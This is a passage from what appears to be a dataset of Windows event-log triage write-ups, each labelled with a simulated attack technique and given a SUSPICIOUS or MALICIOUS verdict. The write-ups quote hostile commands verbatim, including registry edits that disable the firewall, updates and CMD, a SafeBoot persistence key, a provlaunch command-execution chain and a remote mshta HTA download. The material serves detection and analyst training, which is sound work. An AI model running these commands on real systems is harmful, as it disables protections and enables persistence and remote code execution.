   - Various executions starting with PowerShell and involved with Edge Update processes appear consistent with the downgrading or modifying of settings, as suggested by the repetitive executions of processes such as `MicrosoftEdgeUpdate.exe` with ""/regsvc"" and ""/regserver"" parameters, indicating potential misuse of normal update processes.
   - Another suspicious element is the creation and execution of processes within temporary directories such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` within `Temp` or similar directories, an unusual path even for updates.

4. **Use of High Integrity Level**:
   - Several processes running at a high integrity level, such as PowerShell and whoami.exe, within the `admin_test` user's context could suggest attempts to execute with elevated privileges using bypass techniques like UAC bypass.

### Assessment:
- **Indicators of Malicious Activity**: The use of the FodHelper technique, registry modifications for persistence, and misuse of common update processes are strong indicators of potentially malicious activity.

### Resolution:
- **MALICIOUS**: These logs contain evidence of activities commonly associated with attempts to escalate privileges and maintain persistent access via unauthorized means. These operations are characteristic of exploitation methodologies used in targeted attacks to escalate privileges and maintain persistence stealthily.

### Guidance:
- Conduct a full endpoint investigation to identify any unauthorized changes to system files and user accounts.
- Review other systems for similar entries, as attackers may have tried similar tactics on different assets.
- Isolate potentially compromised systems from the network to prevent any further malicious activity.
- Consider implementing enhanced monitoring and alerts for UAC bypass techniques and unexpected registry modifications.
- Ensure that all systems are updated to the latest security patches and disable unnecessary services where possible.
- Evaluate current security policies and tools for potential improvements to detect and prevent unauthorized privilege escalations."
Lolbin Jsc.exe compile javascript to exe,"After thoroughly reviewing the provided logs, a few observations emerge that highlight several behaviors warranting closer scrutiny.

**1. Repeated Time Adjustments:**

- Within the System and Security logs, there are multiple time change events happening in rapid succession:
  - `Event ID 1` (Kernel-General) and `Event ID 4616` (Security-Auditing) show synchronized new and old times suggesting deliberate manipulation.
  - The consistency in `EventRecordID` and short span between the old and new times insinuate frequent minuscule adjustments rather than typical daylight saving or manual adjustments.

While these could be benign if related to legitimate time synchronization tasks, rapid and consecutive adjustments can sometimes correlate with tactics to disrupt chronological logs possibly indicating anti-forensics measures by adversaries.

**2. Process Execution with Elevated Privileges:**

- Sysmon logs show multiple instances of PowerShell (`powershell.exe`) and command-line related processes (`cmd.exe`, `wsmprovhost.exe`, and `wevtutil.exe`) execution involving the user `SERVER002\admin_test`. Specifically, looking at:
  - PowerShell and cmd.exe executions have high integrity levels, possibly running with elevated permissions.
  - The execution of `jsc.exe` from the .NET framework on script files is not typically associated with standard administrative or user tasks but can occur in development settings.
  
  While these could align with normal administrative activities, obfuscated or unusual command-line arguments might suggest suspicious activities.

**3. Unusual Execution of Developer-specific Tools:**

- Execution of `jsc.exe`, the JScript.NET compiler, and `cvtres.exe`, a resource conversion utility, potentially indicates compiling activities. Coupled with copying scripts (`hello.js`), this could be benign if related to development or scripted automation.
- If `admin_test` is not a known developer account or seldom used for such tasks, this sequence can suggest suspicious behavior.

**Resolution:**

Based on the data, we find these logs fall under the **SUSPICIOUS** category. While not definitively malicious, the activities warrant further investigation to rule out misuse or unauthorized behavior:

**Recommended Actions:**
- **Verification of Time Changes:** Connect with system/network administrators to verify if the time changes align with NTP corrections or expected configurations.
- **Validate User Activity:** Review the account `admin_test` for legitimacy of elevated activities—confirming if the actions match known operational tasks or roles.
- **Inspect Command-line Executions:** Retrieve full command-line arguments for PowerShell and command prompt activities. Examine any scripts or batch files for unfamiliar or harmful code.
- **Check for Unauthorized Admin Tools Usage:** Ensure that `jsc.exe` and related compiler activities align with authorized user tasks or projects.

Concluding, while numerous actions seem administrative in nature, overlapping sequences and context (e.g., time manipulation, extensive command-line tool usage) necessitate additional inquiry measures to eliminate suspicion."
Disable Windows CMD application,"After thoroughly reviewing the provided logs, here is a detailed analysis of the observed activities:

1. **Initial Examination of Executed Processes:**
   - The logs show a series of process creation and termination related to standard system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. These processes, per se, do not indicate malicious activity as they are legitimate Windows utilities. 

2. **PowerShell Activity:**
   - A PowerShell command was executed using `New-ItemProperty` to set a registry key (`DisableCMD`) to disable the command prompt. This action is suspicious as it could be indicative of an attempt to reduce administrator access or prevent further analysis on the system. 
   - The command is wrapped in a legitimate-looking operation (`HostApplication=powershell.exe &amp; {New-ItemProperty -Path \""HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\"" -Name DisableCMD -Value 1}`), which can potentially be used to obfuscate its intent.

3. **Edge Browser Activity:**
   - Several log entries indicate activities related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe`, `Setup.exe`). These could be legitimate update processes, but the frequent execution of these processes could suggest unusual behavior if unexpected. Without further context, it remains ambiguous whether these are malicious.

4. **System Time Manipulation:**
   - The system logs record entries indicating the time was set back slightly by the `svchost.exe` process. Changing system time can be part of legitimate time synchronization activity, but it can also be used to confuse timestamp-based log events, making investigations harder.

5. **Security Context and Privilege Activity:**
   - The security logs show normal login activity for the SYSTEM account with elevated privileges being assigned (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`), typical for inherent SYSTEM operations.
   - The presence of such privileges could potentially allow malicious actors to execute privileged commands if they have gained unauthorized control of the SYSTEM account.

### Assessment:

Given the logs:
- **Use of PowerShell** for altering system configurations could be deemed **SUSPICIOUS**, especially because the command involved disabling the command prompt.
- **Frequent execution** of Edge update processes in close temporal proximity could indicate out-of-band updates or a process injection method, though it may also be legitimate if such actions coincide with known update schedules.
- **Time changes**, while not inherently malicious, often require contextual investigation to determine intent.

### Conclusion:
- **Resolution: SUSPICIOUS**: While there's no absolute confirmation of malicious intent, certain activities require further investigation to rule out any potential compromise, specifically focusing on the PowerShell command disabling CMD and the context of the Edge update processes.

### Guidance on How to Proceed:
- Investigate the context and source of the PowerShell command execution to understand its legitimacy.
- Validate the engagement of the Microsoft Edge processes against official update release notes or schedules.
- Monitor for additional unauthorized time alterations and connect with network time servers for consistency.
- Consider employing advanced threat detection methods to capture any live process behavior anomalies."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"### Analysis:

#### Windows Security Logs:
1. Events 4616 indicate time changes on the system via `svchost.exe`. This is generally benign and part of routine time synchronization services. The change is from `2024-10-28 09:29:08` to `2024-10-28 09:29:18`, a 10-second adjustment, which aligns with typical time synchronization. 

#### Application Logs:
1. Logs from `edgeupdate` indicating ""Service stopped"" are present. These logs would be part of normal operations for EdgeUpdate managing service states. No anomalies detected.

#### Sysmon Logs:
1. Multiple entries for `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`. `wevtutil.exe` is often used for querying event logs, which can be benign but might also warrant reviewing user actions if these were abnormal or unexpected.
2. `cmd.exe` executing a registry modification: `reg add ""HKCU\Software\Policies\Microsoft\Windows\OOBE"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f`. While modifying registry keys directly using `cmd.exe` can be normal administrative activity, it warrants attention as this could disable privacy settings, indicating a possible attempt to alter system configuration.
3. Multiple recorded process activities related to `MicrosoftEdgeUpdate.exe`, which correlate with normal update checks and operations. Given they operate under `NT AUTHORITY\SYSTEM`, these services reflect legitimate system updates.

#### System Logs:
1. Kernel events detailing time adjustments (as seen in Security logs) and interactions with time services, which are consistent with regular system timekeeping operations.

#### PowerShell Logs:
- No PowerShell event logs were provided, which could be an oversight or intentional. If PowerShell usage is expected, the absence itself could require reviewing source data acquisition methods.

#### Findings:

- **Benign Activities**: The various process executions and time adjustments observed are generally consistent with routine operations and system protocol for updates and synchronizations.
- **Potentially Suspicious Actions**: The direct modification of registry keys via `cmd.exe`, particularly those related to user privacy settings, can be legitimate but could also be indicative of policy circumvention or unwanted system changes if not authorized.

### Conclusion:

While most activities appear to be benign and are valid aspects of system operations or software updates, the registry modifications warrant further investigation to confirm they align with authorized administrative actions. On the surface, nothing conclusively malicious has been identified, so further context on user activities and intentions can ensure comprehensiveness.

### Resolution: 

**SUSPICIOUS**

The logs do not demonstrate overt malicious activity but an unusual registry modification performed via `cmd.exe` indicates activity that should be scrutinized to rule out unauthorized or unintended system alterations. Recommend verifying with system and security policies, reviewing the recent actions of the involved user, and checking for any correlating system anomalies."
LockBit Black - Unusual Windows firewall registry modification -cmd,"Upon reviewing the provided Windows event logs, we identify events from the Sysmon, Application, and Security logs. The goal is to detect any signs of malicious activity or unusual behavior. Here's a breakdown of the findings:

1. **Sysmon Log:**
   - **Frequent use of wevtutil.exe and conhost.exe**: There are multiple instances where `wevtutil.exe` and `conhost.exe` are executed in rapid succession. While these utilities are valid Windows processes (event log utility and console window host, respectively), their frequent invocation, especially by a user named `SERVER002\\admin_test`, could be suspicious if not correlated with usual system administration tasks.
   
   - **Unusual Command Usage**:
       - The `cmd.exe` instance with a command-line argument to disable the Windows Firewall in the Domain and Standard profiles (`""cmd.exe"" /c reg add ... /v EnableFirewall /t REG_DWORD /d 0 /f`) is highly problematic and typically associated with malicious activity. Disabling the firewall can expose the system to network attacks.
       - The execution of `reg.exe` to add registry entries further enforces the concern over altering firewall settings programmatically.

2. **Application Log:**
   - The entries mostly relate to Microsoft Edge Update activities and other benign system maintenance tasks. They do not show direct signs of attacks or compromises.

3. **Security Log:**
   - **High-level Privileges**: There is evidence of privilege escalation or high privilege usage. The user `admin_test` has a list of high-level privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc., which can be exploited if improperly used or in context with malicious activities.

   - **Logon Events**: The `4624` (successful logon) and `4672` (special privileges assigned) events highlight that the user `admin_test` successfully logged in with NTLM authentication. This is standard, but in combination with the other logs indicating firewall disabling, it raises suspicion if not part of regular or authorized activities.

### Assessment:

- **Threat/Risk**: The act of disabling the firewall via script or command is a significant indicator of malicious intent, especially if done without proper authorization or clear business need.

- **Evaluation**: The primary concern is the alteration of security settings (firewall) through a command line action, unauthorised disabling of such critical security features is often associated with preparatory steps for a broader attack or backdoor installation.

### Conclusion:

- **Resolution**: **MALICIOUS**

### Suggested Actions:

1. **Immediate Containment**: 
   - Re-enable the firewall and investigate all unauthorized configuration changes immediately.
   - Limit the privileges of the user `admin_test` and verify if the account was compromised.

2. **Further Investigation**:
   - Conduct a thorough analysis of the origin and intent of the malicious modifications.
   - Perform checks on related systems and logs for similar patterns or lateral movement indicators.

3. **Enhance Monitoring**:
   - Set up alerts for changes to critical settings such as the firewall.
   - Implement more stringent access control and anomaly detection for privileged user accounts.

4. **Review and Audit**:
   - Audit current security configurations and ensure adherence to the principle of least privilege.
   - Conduct a comprehensive security review of your systems and policies to shore up defenses against similar threats."
InstallUtil evasive invocation,"Upon analysis of the provided Windows event logs, here are the detailed findings:

### Suspicious Activities Identified:

1. **PowerShell Script Execution**
   - The logs indicate the execution of a PowerShell script that is conducting suspicious activities using `InstallUtil.exe`.
   - The command line includes operations like copying `InstallUtil.exe` to `notepad.exe`, which may indicate attempts to masquerade or execute a potentially malicious .NET assembly.
   - The PowerShell script involves a complex command-line operation potentially designed to evade common defenses, termed as ""Evasive Installutil invocation test failure.""

2. **Process Creation and Execution**
   - Multiple instances of system utilities (e.g., `whoami.exe`, `HOSTNAME.EXE`, `conhost.exe`) have been executed by a user `SERVER002\\admin_test` with high integrity level privileges.
   - This suite of processes, particularly involving `wevtutil.exe` and them being run consecutively, could be indicative of attempts to query or manipulate Windows Event Logs.

3. **Net Framework Compilation Activities**
   - Execution of .NET command-line compilers `csc.exe` and `cvtres.exe` originating from PowerShell context, potentially indicating an attempt to compile malicious code directly on the system.

4. **Usage of PowerShell for .NET Framework Invocation**
   - The use of Windows PowerShell to conduct builds and assembly invocations within temporary directories. The actions performed using InstallUtil suggest potential use of Living-off-the-Land Binaries (LoLBins) to execute code in a stealthy manner.

5. **Command-Line Operations**
   - Complex command-line instructions in PowerShell and the construction of a `readme.txt` using manipulated assembly which implies a non-standard use of system utilities typically associated with advanced attack techniques.

### Assessment:
The logs reflect activity that leverages known system utilities in potentially harmful manners. While these activities could occur occasionally in legitimate contexts (e.g., software installations), the combination and specific behaviors, such as leveraging `InstallUtil.exe` in this manner directly from PowerShell, raise concern about the presence of a potential threat actor.

### Threat and Risks:
1. **Potential Compromise:**
   - Use of administrative-level PowerShell sessions for executing assembly loading and command execution.
   - High risk associated with execution of tasks using PowerShell and .NET compilers in such an unconventional manner.

2. **Persistency and Evasion:**
   - The activities could attempt to establish persistence or evade detection through native binaries.

### Final Resolution: **MALICIOUS**
Given the use of advanced techniques to potentially manipulate or insert code using standard system processes, these behaviors are indicative of malicious activity.

### Guidance and Next Steps:
1. **Immediate Actions:**
   - Isolate the involved host from the network to prevent potential lateral movement or data exfiltration.
   - Conduct a thorough investigation on the origin and impact. Inspect PowerShell history and any scripts executed in recent times.
   - Review user account `SERVER002\\admin_test` for any unauthorized access or changes.

2. **Threat Intelligence:**
   - Gather threat intelligence associated with `InstallUtil.exe` based attacks and PowerShell-related threats for further context and indicators.

3. **Monitoring and Defense:**
   - Strengthen logging and monitoring, especially around PowerShell usage with full logging.
   - Implement application whitelisting to prevent execution of unauthorized scripts or commands."
Snake Malware Encrypted crmlog file,"Upon reviewing the provided Windows event logs from the specified host, several activities merit further examination. Below, I outline the activities noted with their potential implications:

1. **WhoAmI and Hostname Executions**: 
   - The logs show the execution of standard Windows tools such as `whoami.exe` and `hostname.exe` by a user `SERVER002\\admin_test` with high integrity level. These tools can be used for enumeration, typically preceding more complex malicious activities. While the presence of these commands alone is not inherently malicious, when performed repeatedly, it may suggest enumeration efforts by an internal or external actor.

2. **Wevtutil Executions**: 
   - Numerous `wevtutil.exe` executions are observed. While it is a legitimate utility for managing event logs, frequent invocations, especially without clear operational need, could indicate attempts to clean or alter logs. This activity is suspicious as it might be associated with anti-forensic behavior to evade detection.

3. **PowerShell Script Execution**:
   - The logs capture a PowerShell command executed by `SERVER002\\admin_test`, which creates a hidden and system-attributed file in the Windows directory. The PowerShell script `New-Item $env:windir\\registration\\...` with attributes `Hidden`, `System`, and `Archive` is particularly concerning. Creating hidden files in system directories can facilitate persistence or concealment mechanisms typical of malware.

4. **Software and System Updates**:
   - Updates to Microsoft Defender and Windows system components (e.g., `wuauclt.exe` and `MS Malware Protection Signature Updates`) are present. However, these appear to be legitimate activities related to routine updates and should not raise immediate concern if verified as genuine.

5. **Taskhostw.exe and Svchost.exe Activity**:
   - These processes are observed with typical usage patterns reflecting normal behavior. They are standard Windows processes used for various system tasks and services management.

6. **Security Audit Events**:
   - Multiple Event ID 5379 entries indicate credential validation failures related to `MicrosoftAccount` and `WindowsLive`. These could result from misconfigurations or attempts to authenticate using invalid credentials. While these events don't directly indicate a compromise, they are worth monitoring in combination with any unsuccessful access attempts or policy changes.

**Assessment and Resolution:**

Based on the logs reviewed, the execution of enumeration commands (`whoami`, `hostname`), the suspicious use of `wevtutil`, and the execution of potentially harmful PowerShell commands create a pattern that warrants concern. The operations might represent the preliminary stages or components of malicious activity.

**Resolution: SUSPICIOUS**

**Recommendation**:

1. **Further Investigation**:
   - Perform a deeper investigation into process execution and explore the context around `whoami`, `hostname`, and PowerShell activity.
   - Check for recent file changes or new files in sensitive or system directories, particularly those created with hidden attributes.

2. **Review User Behavior**:
   - Explore accounts, like `SERVER002\\admin_test`, for unusual access patterns.
   - Examine logs for further enumeration, exfiltration techniques, or lateral movement attempts.

3. **Monitor and Validate Updates**:
   - Validate updates with a trusted source to ensure no tampering.

These recommendations should resolve any ambiguities and help determine whether to escalate the concern to a confirmed threat."
Set a firewall rule using New-NetFirewallRule,"### Analysis of the Logs:

**1. Change in System Time (System Log)**:
   - There are two events indicating a system time change on 2024-10-28 at 12:05:53. These events show an adjustment of the system time backward by approximately 6 seconds, executed by the process `svchost.exe`. This behavior is logged under Event ID 1 and 24 from the Kernel-General provider, which can commonly occur due to system updates or synchronization with an external time server. However, unnecessary time changes can be suspicious if performed without apparent reasons or if they occur frequently.

**2. PowerShell Activity (Sysmon and PowerShell Logs)**:
   - There is a noteworthy PowerShell execution on 2024-10-28 at 12:05:54 running the command: `New-NetFirewallRule -DisplayName ""New rule"" -Direction ""Inbound"" -LocalPort ""21"" -Protocol ""TCP"" -Action ""allow""`. This command creates a new firewall rule allowing inbound TCP traffic on port 21, typically used for FTP. Such changes, especially allowing unrestricted access, should be thoroughly reviewed to ensure they're part of standard operations or needed by legitimate processes, as they could be potential indicators of compromise.

**3. Regular Microsoft Edge Update Activities (Sysmon Log)**:
   - Multiple logs indicate the execution of Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe` and associated installations. These activities appear to be part of the routine update process for Microsoft Edge, as denoted by usual paths and names like `setup.exe` and `MicrosoftEdgeUpdateSetup_X86`. No anomalies are detected in this section of the logs.

**4. Use of System Utilities (Sysmon Log)**:
   - The presence of processes such as `wevtutil.exe` and `conhost.exe` being triggered by `admin_test` are consistent with administrative activities. These utilities are typically employed for event log management and command prompt interactions respectively, and there's no suspicious command-line activity noted within these logs.

### Assessment:

- **Suspicious Activity**: The primary suspicion arises from the creation of a new firewall rule via PowerShell, which modifies the security configuration. Although it could be benign in nature if part of authorized administrative actions, without explicit verification it stands out as needing further validation.
  
- **Benign Activity**: The observed system time change, alongside typical administrative processes and Microsoft Edge updates, does not show immediate signs of malicious intent. System time changes matched with legitimate synchronizations.

### Conclusion & Resolution:

Given the context provided by the log data, the resolution can be classified as **SUSPICIOUS** due to the PowerShell activity creating a new firewall rule. This requires additional investigation to confirm whether it was part of a legitimate administrative task or potential misuse. Further investigation should include:
- Confirming the necessity and authorization of the firewall rule change.
- Reviewing administrative policies and any active tasks scheduled or executed around the same time.
- Ensuring there's no unauthorized access or unusual activity noted in related areas like network logs or account usage.
- Validation with system administrators responsible for any expected security changes and establishing whether the steps were pre-approved."
Disable Windows OS Auto Update,"Upon analyzing the provided Windows event logs, I performed a detailed examination of the Application, System, Sysmon, and Security logs. I focused on identifying any unusual process execution, suspicious command-line arguments, and any instances of potential elevation of privileges or other indicators of compromise.

### Observations:

1. **Application Logs:**
   - The `edgeupdate` service stopped:
     - Entries at 2024-10-24 17:13:33 and 2024-10-24 17:13:34 depict the `edgeupdate` service stopping, which could be part of a standard update process or service management tasks. No immediate evidence of tampering or misuse.

2. **System Logs:**
   - **Time Change Events (EventID 4616):**
     - The logs demonstrate successive changes in system time around 17:13:12. While this could be a normal synchronization with an NTP server (time.windows.com), frequent or abrupt time changes can also sometimes be indicative of attempt to evade forensic investigation (e.g., tampering with log timestamps). 

3. **Sysmon Logs:**
   - **Common Administrative Tools Execution:**
     - Processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` were executed by the user `SERVER002\admin_test`.
     - Many instances of processes like `cmd.exe` executing with suspicious command-line arguments (`cmd.exe` /c reg add...) that add or modify registry keys to disable automatic updates: 
       ```
       reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f
       ```
     - While this could theoretically be an administrative task, aggressive modification of system update policies without clear change management records can indicate malicious intent. Such activities typically necessitate a review to ensure compliance with organizational policies.

   - **Microsoft Edge Updates:**
     - Numerous events involving `MicrosoftEdgeUpdate.exe` and its associated components detected across a brief period (resulting from legitimate software update activities).

4. **Security Logs:**
   - Time setting events (EventID 4616) match those in the System and Sysmon logs with `svchost.exe` as an operating process. The changes in system time need further clarification if they are of organizational policy.

### Assessment:

- **BENIGN:** The presence of repeated use of administrative tools by an authorized user suggests regular system maintenance or administrative tasks, especially if they're compliant with internal policies.
- **SUSPICIOUS:** The command modifying the system registry to change auto-update settings stands out, particularly without corresponding documentation or apparent authorization. Furthermore, time synchronization might need further scrutiny due to its proximity to these events.

### Conclusion:

Given the information and without additional context available (e.g., change logs, user activity logs, or explicit authorization records), the overall activities lean towards potentially **SUSPICIOUS**. Further investigation is advised to ensure these activities align with company IT policies and that configurations are not tampered with without consent. The IT support team or security team should verify the intentions behind registry changes and if necessary, roll back unauthorized changes."
Windows Add Registry Value to Load Service in Safe Mode with Network,"The comprehensive analysis of the provided logs is broken down below:

1. **Sysmon Logs:**
   - **Wevtutil Executions:** Frequent execution of `wevtutil.exe` is noted. This tool is legitimate and typically used for managing event logs, but it can be used maliciously to clear logs or extract information without detection. The process was running under an administrative user context `SERVER002\\admin_test`, but there is no immediate indication of malicious command-line arguments or forbidden activities like clearing event logs.
   - **Cmd.exe Execution:** The most notable suspicious activity is a `cmd.exe` process with the command `/c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""`. This modifies the system registry in relation to SafeBoot, potentially indicating an attempt to modify the system boot options, which is a typical step in establishing persistence or preparing for a malicious attack.
   - **Conhost and Whoami Executions:** Multiple instances of `conhost.exe` and `whoami.exe` were seen, which are normal system operations unless coupled with suspicious behavior. In this case, they appear typical and related to administrative tasks.
   - **Microsoft Edge Update:** Regular activities from `MicrosoftEdgeUpdate.exe` processes. This involved updates and installations under the `NT AUTHORITY\SYSTEM` context, consistent with automatic updates, and no deviations that hint towards compromise.

2. **System Logs:**
   - No immediately suspicious activities observed. Regular time synchronization and kernel operations reported.

3. **Security Logs:**
   - **Privilege Escalation:** The privilege escalation event (event ID 4672) logged for user `admin_test` shows that elevated privileges were granted. This could be legitimate if the user was performing high-level admin tasks but could also be indicating lateral movement or privilege escalation if unexpected.
   - **Logon Event:** The logon event (event ID 4624) associated with `admin_test` under NTLM could be valid under the right circumstances. However, NTLM usage could be leveraged for pass-the-hash or other lateral movements, especially if it involved network logins.
   - **Logoff Event:** Event ID 4634 marks the end of a session for `admin_test`, which is standard post-operations.

4. **Application Logs:**
   - Routine `Service stopped` messages from `edgeupdate`, which is normal during lifecycle tasks by the Update Service.

5. **Summary:**
    - The execution of command-line argument modifying registry concerning SafeBoot is notably suspicious. It stands out as potentially malicious activity due to its implications on system boot configurations. The events involving `admin_test` with elevated rights could be standard operations or part of the perceived illicit behavior depending on the context and privileges usually accorded to `admin_test`.

**Final Assessment:**
- **Resolution: SUSPICIOUS**
  - There are behaviors, particularly the registry change via `cmd.exe`, that warrant closer inspection as they hint at potential compromise or pending malicious activity. The frequent executions of administrative tools like `wevtutil` with administrative rights should also be scrutinized further to rule out any intentions to manipulate or hide logs. Further investigation is advised to validate the integrity and intention of these actions, particularly the user context under which these actions occurred. Implement active monitoring for any additional unauthorized privilege escalations, registry changes, or unexpected network-level actions."
Create Windows Hidden File with powershell,"### Detailed Analysis

1. **Process Execution and Command-Line Arguments:**
   - Multiple instances of `cmd.exe` and `conhost.exe` have been executed, accompanied by various command-line arguments. The command-line argument `cmd.exe /c IF EXIST %temp%\data.txt ( EXIT 0 ) ELSE ( EXIT 1 )` checks for the existence of a file in the temp directory and `cmd.exe /c echo system_Attrib_data >> %temp%\data.txt` appends data to a file. Such actions could be legitimate, related to system checks or automated scripts that run on Server002. However, frequent executions within very short time frames could be suspicious if they were not part of routine operations or expected automated tasks.
   
   - Execution of `wevtutil.exe` is tracked in the logs without command-line arguments. This utility is used to manage Windows event logs, which could potentially be leveraged for malicious intent to clear logs or modify events if not part of legitimate operations.
   
2. **PowerShell Activities:**
   - The PowerShell command `powershell.exe & {$file = Get-Item $env:temp\data.txt -Force, $file.attributes='Hidden'}` appears to hide a file in the temporary directory. This action, while not inherently malicious, is often related to attempts to obscure data or processes and, without context, is unusual and could be used to evade detection or hide indicators of compromise.

3. **Privilege Escalation and User Context:**
   - The logs primarily involve the user `SERVER002\admin_test`, operating with a high integrity level, indicating administrative privileges. The consistent use of high-privilege accounts for operations in system directories and temporary directories, especially involving PowerShell, leads to a potential risk if those actions were not authorized or expected.

4. **Overall Behavioral Indicators:**
   - The repetition of tasks within a narrow timeframe, especially involving command shell operations and attempts to modify/hide file attributes, when coupled with administrative privileges, raises the bar from potentially mundane automation tasks to needing further investigation.

### Assessment

- The combination of repeated command shell and PowerShell usage with administrative privileges, actions to manipulate file visibility, and the interaction with system utilities (like `wevtutil.exe`), goes beyond typical benign activities on a server: 

### Resolution

**SUSPICIOUS** - The activities recorded in the logs suggest a potential risk; while no clear malicious action is identified, the combined indicators warrant deeper investigation to rule out misuse or unauthorized behavior. Close review of related user activities, validation of authorized scripts and tasks, and monitoring for further irregularities is recommended."
Invoke HTML Application - Direct download from URI,"**Analysis of Windows Event Logs**

Upon analyzing the provided Windows event logs, specifically focusing on the PowerShell and Sysmon logs, I have identified some suspicious activities that raise concerns:

1. **PowerShell Activities:**
   - The logs indicate the execution of PowerShell commands with the ""Invoke-ATHHTMLApplication"" along with a URI pointing to a potentially malicious file hosted on GitHub (`https://raw.githubusercontent.com/file/file-file/24549e3866407c3080b95b6afebf78e8acd23352/files/data.005/src/data.005.hta`).
   - The command utilizes the `mshta.exe` application, which is known to be leveraged in “living off the land” attacks to execute scripts or malicious content remotely without dropping any files on disk.

2. **Sysmon Logs:**
   - Multiple events are logged for the execution of PowerShell and `mshta.exe`, indicating potential scripting or downloading and execution of remote content.
   - The execution of processes like `whoami.exe` and `hostname.exe` suggests reconnaissance activity, which is typical in the early stages of an attack to gather information about the system environment and user context.

3. **User Context:**
   - The activities were performed by a user identified as `SERVER002\\admin_test`, suggesting the involvement of a user account with elevated privileges, which may lead to unauthorized actions if compromised.

**Assessment of the Situation:**
- These logs strongly suggest the presence of malicious activity, given the use of PowerShell to execute a command that uses a known attack vector (`mshta.exe`) along with the reconnaissance commands executed in sequence.
- The actions captured are indicative of an attacker attempting to download and execute potentially malicious content from an external source, possibly as part of a broader cyber attack or penetration testing that was unauthorized.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate `Server002` from the network to prevent any further potential malicious activities.
   - Revoke access for the `admin_test` user account and initiate a password reset or account review process.

2. **Thorough Investigation:**
   - Conduct a comprehensive scan for malware and unusual activities across the system.
   - Investigate logs for any lateral movement or additional compromised accounts.

3. **Mitigation:**
   - Implement stricter script execution policies for PowerShell and limit the use of `mshta.exe` if not needed.
   - Enforce the principle of least privilege on user accounts to minimize potential attack surfaces.

4. **Review and Fortify Security Posture:**
   - Examine and enhance security monitoring capabilities.
   - Deploy endpoint detection and response tools to improve detection of similar attacks in the future.

Following these steps will help ensure that potential threats are mitigated and systems are safeguarded against future attacks."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"Upon examining the provided Windows event logs, several key points stand out that require attention in the context of security analysis:

### Indicators of Suspicion:

1. **Wevtutil and Conhost Executions**:
   - There are multiple instances where `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\admin_test`. While the tools are legitimate Windows binaries, frequent executions in quick succession can sometimes be linked to suspicious activities like clearing event logs or handling console applications.
   
2. **Command Line for cmd.exe**:
   - The execution of `cmd.exe` with the command line arguments to modify the Windows registry using `reg.exe` and execute the `calc.exe` application is highly suspicious:
     - `""cmd.exe"" /c reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin`.
   - This chain of commands indicates potential misuse of Windows auto-elevation binaries (Living-off-the-land binaries or LOLBins) for unauthorized tasks.
   
3. **Execution of Elevated Integrity Processes**:
   - The operations (by `CMD`, `REG`, `provlaunch.exe`, `calc.exe`) are executed with high integrity level, suggesting that these processes are operating with enhanced privileges.

4. **Sysmon EventID 5 (Process Termination)**:
   - Several process termination logs correspond to the `MicrosoftEdgeUpdate.exe` and other associated files in temp directories, which can indicate potential temporary updates. While this may be normal, excessive and parallel executions are noteworthy.

5. **Security Time Change Events**:
   - Multiple time change logging under EventID 4616 shows process `svchost.exe` conducting time modifications. Coupled with related `Kernel-General` logs in the `System` channel can be normal for synchronization purposes but should be monitored for irregular patterns.

### Assessment:

Based on the investigation, the logs show activity that intertwines with potentially suspicious patterns. While `Microsoft Edge Update` normally performs actions including temporary setups and updates, the registry manipulation to launch `calc.exe` and processor executions with `cmd.exe` amidst these updates is unexpected under usual usage scenarios and needs further investigation to rule out the use of system binaries circumventing restrictions.

### Resolution:

- **SUSPICIOUS**: The logs indicate suspicious activity related to command execution and registry manipulation, which needs further investigation. The behavior, particularly involving the misuse of LOLBins to execute unintended applications and manipulate registry keys, warrants deeper scrutiny to determine the intent and potential security breach.

### Guidance:

1. **Immediate Verification**:
   - Validate the legitimacy of the user `SERVER002\admin_test` and inspect their activity.
   - Determine if the observed activity, especially concerning `reg.exe` and `cmd.exe`, is part of any legitimate update or administrative task.

2. **Enhanced Monitoring**:
   - Implement enhanced logging and alert monitoring on processes attempting to modify registry keys without authorization.
   - Temporarily increase scrutiny and controls around user `SERVER002\admin_test` and initiate a review of their session history.

3. **Engage Threat Intelligence**:
   - Cross-reference any hash or binaries involved with known threat databases.
   - Consider updating security signatures to detect similar suspicious patterns in real-time.

In summary, timely intervention in the form of further analysis and verification is advised to address the suspicious activities flagged in the logs."
Lolbin Gpscript startup option,"After analyzing the provided Windows event logs, I present the following detailed assessment:

### Analysis:

1. **Security Logs:**
   - The security logs indicate multiple time change events (EventID 4616) executed by `svchost.exe` under the identity of `LOCAL SERVICE`. These events are often part of legitimate system activity for time synchronization, but it's essential to verify if these are expected or unusual according to your organization's baseline.

2. **Application Logs:**
   - Logs from `edgeupdate`, a service related to Microsoft Edge updates, consistently show service stops. These actions seem aligned with standard update processes unless corroborated by unexpected network activity or change in settings.

3. **System Logs:**
   - The system logs show kernel general events related to time changes, which aligns with security log observations. Kernel events regarding time synchronization using `time.windows.com` suggest regular NTP synchronization.

4. **Sysmon Logs:**
   - The logs capture activities primarily centered around Microsoft Edge Update processes and some PowerShell-related activities. Significant activities are:
     - Execution of `whoami.exe` and `cmd.exe`, which could be indicative of user information gathering and script execution. However, given the context, these might be legitimate administrative actions. 
     - Multiple executions of `wevtutil.exe`, a utility for managing event logs, run under an administrative account, is common for scripting and automation but could be flagged for review.
